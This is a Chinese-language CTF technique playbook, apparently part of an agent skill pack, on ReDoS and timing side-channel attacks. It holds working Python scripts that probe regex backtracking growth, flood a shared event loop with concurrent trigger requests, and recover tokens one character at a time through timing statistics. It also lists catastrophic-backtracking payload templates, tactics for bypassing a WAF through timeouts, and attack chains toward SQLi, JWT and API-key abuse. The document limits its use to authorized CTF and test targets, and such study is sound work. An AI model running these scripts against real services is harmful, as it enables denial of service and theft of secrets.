# ReDoS & 时序攻击

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/03-injection/redos-timing.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
> **什么时候用**：命中「ReDoS / 正则回溯 / catastrophic backtracking / 时序攻击」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- ReDoS
- 正则回溯
- catastrophic backtracking
- 时序攻击
- timing attack
- WAF超时
- event loop
- side channel

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

1. **`(a+)+$`** — 嵌套量词回溯
2. **`([a-z]+)*$`** — group + star
3. **路径 rewrite** — 路由层耗时
4. **email/url validator** — 注册/搜索/导入接口
5. **top1 多轮一致且差距 > stdev** — 扩展下一位
6. **top 候选轮换** — 增加样本、换时间窗口
7. **所有候选一起慢** — 加 control，不推进
8. **正确长度突然固定慢** — 先恢复长度

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **命中样本** — 长度线性增加，耗时指数/超线性增长
- **失败样本** — 所有长度耗时随机跳动
- **命中样本** — trigger 时普通 probe 延迟同步升高
- **失败样本** — 只有 trigger 自己慢
- **命中样本** — WAF 错误/超时后业务处理推进
- **失败样本** — WAF 统一 403
- **命中样本** — 正确前缀均值/中位数稳定偏高
- **失败样本** — 差异小于噪声
- **命中样本** — control 与 candidate 同时慢
- **失败样本** — 排队/限速，不是侧信道
- **观察点** — 嵌套量词回溯
- **观察点** — group + star
- **观察点** — 路由层耗时
- **观察点** — 注册/搜索/导入接口

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

ReDoS 是算法复杂度输入，Timing 是响应时间侧信道。两者都不能凭一次慢响应下结论，必须建立 baseline、增长曲线、样本分布和失败样本。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| 输入被正则验证 | 递增长度曲线 | 长度线性增加，耗时指数/超线性增长 | 所有长度耗时随机跳动 |
| Node/单线程服务 | 并发 trigger + probe | trigger 时普通 probe 延迟同步升高 | 只有 trigger 自己慢 |
| WAF 复杂规则 | prefix 触发回溯 + payload 后缀 | WAF 错误/超时后业务处理推进 | WAF 统一 403 |
| token/API key 比较 | 多样本逐字符 timing | 正确前缀均值/中位数稳定偏高 | 差异小于噪声 |
| rate limit/queue | 交错 baseline/control | control 与 candidate 同时慢 | 排队/限速，不是侧信道 |

## 工作流

```text
建立 baseline 和 control 输入
  → 长度/前缀单变量增长
  → 多轮采样并裁剪异常值
  → 对比 trigger 与 probe 是否相关
  → 只在稳定差异时推进利用链
  → 记录分布、阈值、失败样本
```

## 0. ReDoS 增长曲线

```python
#!/usr/bin/env python3
import argparse
import json
import statistics
import time
import requests

def measure(url, param, value, samples):
    out = []
    for _ in range(samples):
        t0 = time.perf_counter()
        r = requests.get(url, params={param: value}, timeout=30)
        out.append((time.perf_counter() - t0) * 1000)
    xs = sorted(out)
    trim = xs[1:-1] if len(xs) > 4 else xs
    return {"status": r.status_code, "mean_ms": statistics.mean(trim), "median_ms": statistics.median(trim), "min_ms": min(xs), "max_ms": max(xs)}

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True)
    ap.add_argument("--char", default="a")
    ap.add_argument("--suffix", default="!")
    ap.add_argument("--start", type=int, default=8)
    ap.add_argument("--stop", type=int, default=28)
    ap.add_argument("--step", type=int, default=4)
    ap.add_argument("--samples", type=int, default=5)
    args = ap.parse_args()
    for n in range(args.start, args.stop + 1, args.step):
        value = args.char * n + args.suffix
        print(json.dumps({"n": n, "result": measure(args.url, args.param, value, args.samples)}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

成功样本：`n` 增长时 median 呈明显超线性增长，并且 control 输入不随之增长。失败样本：所有输入一起变慢，通常是网络、限速或排队。

## 1. 正则族与输入模板

| 正则族 | 输入模板 | 观察点 |
|---|---|---|
| `(a+)+$` | `a^n + !` | 嵌套量词回溯 |
| `(a|aa)+$` | `a^n + !` | 分支回溯 |
| `([a-z]+)*$` | `a^n + !` | group + star |
| 路径 rewrite | `/a/a/.../!` | 路由层耗时 |
| email/url validator | 长 local/domain + 破坏后缀 | 注册/搜索/导入接口 |

## 2. 事件循环 oracle

```python
#!/usr/bin/env python3
import argparse
import concurrent.futures
import json
import time
import requests

def hit(method, url, **kwargs):
    t0 = time.perf_counter()
    r = requests.request(method, url, timeout=30, **kwargs)
    return {"status": r.status_code, "ms": round((time.perf_counter() - t0) * 1000, 2), "sample": r.text[:120]}

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--trigger-url", required=True)
    ap.add_argument("--probe-url", required=True)
    ap.add_argument("--param", required=True)
    ap.add_argument("--evil", required=True)
    ap.add_argument("--workers", type=int, default=12)
    args = ap.parse_args()
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = []
        for _ in range(args.workers // 3):
            futs.append(("trigger", ex.submit(hit, "GET", args.trigger_url, params={args.param: args.evil})))
        for _ in range(args.workers):
            futs.append(("probe", ex.submit(hit, "GET", args.probe_url)))
        for label, f in futs:
            try:
                print(json.dumps({"type": label, **f.result()}, ensure_ascii=False))
            except Exception as e:
                print(json.dumps({"type": label, "error": str(e)}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

命中判断：trigger 慢的同时 probe 也稳定慢，说明共享 event loop / worker pool 被卡住；只有 trigger 慢通常只是局部正则耗时。

## 3. Timing 逐字符统计

```python
#!/usr/bin/env python3
import argparse
import json
import statistics
import string
import time
import requests

def sample(url, param, value, samples):
    xs = []
    for _ in range(samples):
        t0 = time.perf_counter()
        requests.get(url, params={param: value}, timeout=10)
        xs.append((time.perf_counter() - t0) * 1_000_000)
    xs.sort()
    trim = xs[2:-2] if len(xs) > 8 else xs
    return {"mean": statistics.mean(trim), "median": statistics.median(trim), "stdev": statistics.pstdev(trim), "n": len(trim)}

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", default="token")
    ap.add_argument("--prefix", default="")
    ap.add_argument("--charset", default=string.ascii_lowercase + string.digits)
    ap.add_argument("--samples", type=int, default=20)
    args = ap.parse_args()
    rows = []
    for ch in args.charset:
        value = args.prefix + ch
        stat = sample(args.url, args.param, value, args.samples)
        rows.append({"ch": ch, **stat})
    rows.sort(key=lambda x: x["median"], reverse=True)
    print(json.dumps({"prefix": args.prefix, "top": rows[:8], "all": rows}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

判定矩阵：

| 现象 | 解释 | 下一步 |
|---|---|---|
| top1 多轮一致且差距 > stdev | 可能存在前缀比较 | 扩展下一位 |
| top 候选轮换 | 噪声覆盖 | 增加样本、换时间窗口 |
| 所有候选一起慢 | 限速/排队 | 加 control，不推进 |
| 正确长度突然固定慢 | 长度先验泄露 | 先恢复长度 |

## 4. WAF timeout 分叉

| 变体 | 操作 | 命中样本 | 失败样本 |
|---|---|---|---|
| redos prefix | 复杂输入 + benign payload | WAF 超时或业务响应推进 | 统一 403 |
| payload before prefix | payload + 复杂输入 | WAF 先拦截 | 顺序无差异 |
| control prefix | 同长度简单输入 | 不慢 | control 同样慢 |
| 并发 trigger | 多个慢输入 | 后续请求排队 | 单请求局部慢 |

## 攻击链

```text
ReDoS
  → 正则增长曲线命中
  → 事件循环/网关/WAF 分叉
  → 认证、过滤、队列或缓存行为差异
  → 转 SQLi/XSS/API/业务动作

Timing
  → baseline/control 样本
  → 逐字符候选统计
  → token/secret/issuer 前缀恢复
  → 转 CSRF/JWT/API key 链
```

## Evidence

| 项 | 记录内容 |
|---|---|
| baseline | control 输入、样本数、均值/中位数/stdev |
| ReDoS 曲线 | 长度、payload、每档耗时、状态码、响应 hash |
| 并发 oracle | trigger/probe 时间相关性、worker 数、失败请求 |
| Timing 统计 | prefix、charset、top 候选、多轮稳定性 |
| 成功样本 | 稳定耗时差异导致 token/状态/过滤/flag 推进 |
| 失败样本 | 排队、限速、缓存、网络抖动、所有候选同分布 |
| 下一跳 | WAF 分叉转具体注入；token 转 CSRF/JWT；DoS 维度转 22-dos |
